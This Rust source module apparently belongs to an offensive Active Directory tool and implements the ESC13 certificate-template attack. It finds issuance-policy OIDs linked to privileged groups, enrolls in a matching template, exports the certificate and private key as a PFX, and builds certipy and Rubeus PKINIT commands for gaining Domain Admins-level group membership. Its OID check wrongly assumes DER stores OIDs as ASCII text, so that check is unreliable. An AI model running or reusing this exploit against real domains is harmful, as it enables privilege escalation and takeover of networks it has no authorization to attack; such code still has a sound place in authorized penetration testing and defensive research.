//! ESC13 — Issuance Policy with OID-to-Group Link (`msDS-OIDToGroupLink`)
//!
//! ESC13 exploits the Active Directory feature where a certificate **issuance
//! policy OID** is linked to a security group via the `msDS-OIDToGroupLink`
//! attribute on the corresponding `msPKI-Enterprise-Oid` object in the
//! Configuration Naming Context.
//!
//! When a user authenticates using a certificate that contains such an OID
//! (via PKINIT or Schannel), Active Directory's `KDC Certificate Extensions`
//! processing grants the user **transient membership** in the linked group for
//! that session.  If the linked group is privileged (e.g. Domain Admins,
//! Enterprise Admins), the user authenticating with the certificate gains
//! elevated privileges — even if they don't normally hold group membership.
//!
//! **Vulnerable configuration:**
//! - A certificate template includes an issuance policy OID in the
//!   `msPKI-Certificate-Policy` attribute.
//! - The corresponding `msPKI-Enterprise-Oid` object has
//!   `msDS-OIDToGroupLink = <privileged_group_DN>`.
//! - The attacker (or a low-privilege user) can enroll in the template.
//!
//! **Attack flow:**
//! 1. Enumerate `msPKI-Enterprise-Oid` objects in the Configuration NC to find
//!    any with `msDS-OIDToGroupLink` pointing to a privileged group.
//! 2. Find a template whose `msPKI-Certificate-Policy` contains the linked OID
//!    and that allows enrollment by the current user.
//! 3. Request a certificate from that template.
//! 4. Authenticate with the cert via PKINIT → TGT will include the linked group's SID
//!    in the PAC → TGT grants group membership.
//!
//! Reference: Jonas Bülow Knudsen (@Jonas_b_knudsen), "ESC13 Abuse Technique" (2023)

use crate::adcs::pfx::create_pfx;
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_client_auth_csr};
use crate::error::{OverthroneError, Result};
use tracing::info;

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// LDAP attribute that links an issuance policy OID to a group
pub const MSDS_OID_TO_GROUP_LINK: &str = "msDS-OIDToGroupLink";

/// LDAP attribute on `msPKI-Enterprise-Oid` objects holding the OID value
pub const MSPKI_CERT_TEMPLATE_OID: &str = "msPKI-Cert-Template-OID";

/// Object class for policy OID objects in the Configuration NC
pub const MSPKI_ENTERPRISE_OID_CLASS: &str = "msPKI-Enterprise-Oid";

/// LDAP search path for OID objects (relative to the forest Configuration NC)
pub const OID_CONTAINER_RDN: &str = "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration";

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// An issuance policy OID that is linked to a privileged group
#[derive(Debug, Clone)]
pub struct LinkedIssuancePolicy {
    /// Distinguished Name of the `msPKI-Enterprise-Oid` object
    pub oid_object_dn: String,
    /// The OID string value (e.g. `1.3.6.1.4.1.311.21.8.X...`)
    pub oid_value: String,
    /// DN of the target group (the `msDS-OIDToGroupLink` value)
    pub linked_group_dn: String,
    /// Display name of the linked group
    pub linked_group_name: String,
    /// Whether the linked group is considered privileged
    pub is_privileged: bool,
}

/// A certificate template vulnerable to ESC13
#[derive(Debug, Clone)]
pub struct Esc13VulnerableTemplate {
    /// Template common name
    pub template_name: String,
    /// Templates display name
    pub display_name: String,
    /// The linked issuance policy embedded in this template
    pub linked_policy: LinkedIssuancePolicy,
    /// Whether the current user can enroll
    pub enrollable: bool,
}

/// Configuration for an ESC13 attack run
#[derive(Debug, Clone)]
pub struct Esc13Config {
    /// CA web enrollment server URL
    pub ca_server: String,
    /// Template to enroll in (must contain the linked issuance policy OID)
    pub template: String,
    /// Subject CN for the certificate request
    pub subject_cn: String,
    /// The issuance policy OID that links to the target group
    pub policy_oid: String,
    /// Distinguished name of the privileged group the OID links to
    pub linked_group_dn: String,
}

/// Result of a completed ESC13 attack
#[derive(Debug, Clone)]
pub struct Esc13Result {
    /// Issued certificate containing the linked issuance policy OID
    pub certificate: IssuedCertificate,
    /// The group membership that will be granted upon PKINIT authentication
    pub granted_group_dn: String,
    /// PKINIT authentication command
    pub pkinit_command: String,
    /// Explanation of what the authentication will achieve
    pub impact_description: String,
}

// ─────────────────────────────────────────────────────────
//  LDAP discovery helpers
// ─────────────────────────────────────────────────────────

/// Generate the LDAP filter to find `msPKI-Enterprise-Oid` objects with
/// `msDS-OIDToGroupLink` populated (i.e. all linked issuance policies).
pub fn linked_oid_ldap_filter() -> &'static str {
    "(&(objectClass=msPKI-Enterprise-Oid)(msDS-OIDToGroupLink=*))"
}

/// Build the LDAP base DN for OID objects given the forest root domain NC.
///
/// Example: for `dc=corp,dc=local` → `CN=OID,CN=Public Key Services,
/// CN=Services,CN=Configuration,DC=corp,DC=local`
pub fn oid_container_dn(forest_root_nc: &str) -> String {
    format!("{},{}", OID_CONTAINER_RDN, forest_root_nc)
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC13 exploiter — issuance policy OID-to-group link abuse
pub struct Esc13Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc13Exploiter {
    /// Create a new ESC13 exploiter
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute the ESC13 attack — enroll in the template containing the
    /// linked issuance policy OID.
    pub async fn exploit(&self, config: &Esc13Config) -> Result<Esc13Result> {
        info!(
            "ESC13 attack: template={}, policy_oid={}, linked_group={}",
            config.template, config.policy_oid, config.linked_group_dn
        );

        // Create a standard client-auth CSR (the CA embeds the issuance policy
        // from the template definition, not the CSR itself)
        let (csr_der, private_key) =
            create_client_auth_csr(&config.subject_cn, &config.template, None)?;

        let response = self
            .web_client
            .submit_request(&csr_der, &config.template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 13,
                reason: format!("CA rejected ESC13 request: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;

        // Verify the issuance policy OID is embedded in the issued cert
        Self::warn_if_oid_missing(&cert_data, &config.policy_oid);

        let domain = config
            .linked_group_dn
            .to_lowercase()
            .split("dc=")
            .skip(1)
            .map(|s| s.trim_end_matches(','))
            .collect::<Vec<_>>()
            .join(".");

        let group_name = config
            .linked_group_dn
            .split(',')
            .next()
            .and_then(|cn| cn.split('=').nth(1))
            .unwrap_or("PrivilegedGroup");

        let pkinit_command = format!(
            "certipy auth -pfx {}.pfx -dc-ip <DC_IP> -domain {}\n\
             # OR:\n\
             Rubeus.exe asktgt /user:{} /certificate:{}.pfx /domain:{} /nowrap",
            config.subject_cn.to_lowercase(),
            domain,
            config.subject_cn,
            config.subject_cn.to_lowercase(),
            domain,
        );

        let impact_description = format!(
            "The issued certificate contains issuance policy OID '{}', which is linked via \
             msDS-OIDToGroupLink to group '{}'. On PKINIT authentication, the KDC will include \
             this group's SID in the TGT PAC, granting transient membership in '{}'.",
            config.policy_oid, group_name, group_name
        );

        let pfx_data =
            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());

        Ok(Esc13Result {
            certificate: IssuedCertificate {
                pfx_data,
                thumbprint: Self::compute_thumbprint(&cert_data),
                serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                valid_from: "Unknown".to_string(),
                valid_to: "Unknown".to_string(),
                template: config.template.clone(),
                subject: format!("CN={}", config.subject_cn),
                issuer: self.web_client.base_url(),
                public_key_algorithm: "RSA".to_string(),
                signature_algorithm: "SHA256RSA".to_string(),
                private_key_pem: private_key,
            },
            granted_group_dn: config.linked_group_dn.clone(),
            pkinit_command,
            impact_description,
        })
    }

    /// Emit a warning if the specified OID is not found inside the
    /// Certificate Policies extension (OID 2.5.29.32) of the issued certificate.
    ///
    /// The method scans the raw DER bytes of the extension value for the expected
    /// OID string encoded as UTF-8 (a best-effort heuristic; a correct approach
    /// would fully parse the CertificatePolicies ASN.1 sequence).
    fn warn_if_oid_missing(cert_der: &[u8], expected_oid: &str) {
        use x509_parser::parse_x509_certificate;

        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                for ext in cert.extensions() {
                    if ext.oid.to_string() == "2.5.29.32" {
                        // The CertificatePolicies extension value contains DER-encoded
                        // OID objects.  Search the raw value bytes for the expected OID
                        // string encoded as ASCII (OID dots and digits are 7-bit safe).
                        let raw = ext.value;
                        let oid_bytes = expected_oid.as_bytes();
                        let found = raw.windows(oid_bytes.len()).any(|w| w == oid_bytes);

                        if found {
                            info!(
                                "ESC13: Confirmed issuance policy OID {} is present in issued certificate",
                                expected_oid
                            );
                        } else {
                            tracing::warn!(
                                "ESC13: Issuance policy OID {} NOT found in Certificate Policies \
                                 extension — template may not link this OID",
                                expected_oid
                            );
                        }
                        return;
                    }
                }
                tracing::warn!(
                    "ESC13: Certificate Policies extension (2.5.29.32) absent — \
                     OID {} cannot be confirmed; template may not embed the issuance policy",
                    expected_oid
                );
            }
            Err(_) => {
                tracing::warn!("ESC13: Could not parse certificate DER to verify OID");
            }
        }
    }

    fn compute_thumbprint(der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let digest = Sha1::digest(der);
        hex::encode(digest)
    }

    fn extract_serial(der: &[u8]) -> Option<String> {
        use x509_parser::parse_x509_certificate;
        parse_x509_certificate(der)
            .ok()
            .map(|(_, c)| c.raw_serial_as_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_linked_oid_ldap_filter() {
        let filter = linked_oid_ldap_filter();
        assert!(filter.contains(MSPKI_ENTERPRISE_OID_CLASS));
        assert!(filter.contains(MSDS_OID_TO_GROUP_LINK));
    }

    #[test]
    fn test_oid_container_dn() {
        let dn = oid_container_dn("DC=corp,DC=local");
        assert!(dn.starts_with("CN=OID"));
        assert!(dn.contains("DC=corp,DC=local"));
    }

    #[test]
    fn test_msds_oid_to_group_link_attribute() {
        assert_eq!(MSDS_OID_TO_GROUP_LINK, "msDS-OIDToGroupLink");
    }

    #[test]
    fn test_linked_issuance_policy_fields() {
        let policy = LinkedIssuancePolicy {
            oid_object_dn: "CN=1234,CN=OID,...".to_string(),
            oid_value: "1.3.6.1.4.1.311.21.8.1234".to_string(),
            linked_group_dn: "CN=Domain Admins,CN=Users,DC=corp,DC=local".to_string(),
            linked_group_name: "Domain Admins".to_string(),
            is_privileged: true,
        };
        assert!(policy.is_privileged);
        assert!(policy.oid_value.starts_with("1.3.6.1.4.1.311.21.8"));
    }
}
